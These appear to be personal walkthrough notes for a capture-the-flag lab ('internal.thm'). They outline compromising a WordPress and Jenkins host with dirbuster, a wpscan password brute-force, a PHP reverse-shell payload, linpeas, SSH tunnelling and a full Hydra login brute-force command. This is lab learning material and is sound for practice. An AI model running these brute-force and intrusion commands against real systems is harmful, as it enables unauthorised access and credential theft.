1. Scan with dirbuster, wordlist is in /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt to get /blog, wp
2. Change /etc/hosts: ip internal.thm . Remember to use sudo so don't waste time do it again
3. wpscan to get access: wpscan --url http://internal.thm/blog/ --usernames admin --passwords /home/phulelouch/Downloads/SecLists/Passwords/darkweb2017-top10000.txt
4. php pentest monkey payload, but may need to use something else
5. linpeas.sh (it suppose to show /opt have some interesting file but it stop middle so need to find out), but remember to check files manually
6. ssh to user, linpeas.sh again 
7. SSH TUNNLING: ssh -L your_machine_port:ip_you_want_to_access:port_want_to_access user@host <normal>
ssh -L 4444:172.17.0.2:8080 aubreanna:@10.10.107.36
8. Hydra http-post-form: hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 16 -s 4444 localhost http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Error" -vV -f
9. Jenkins 
10. get root and credential

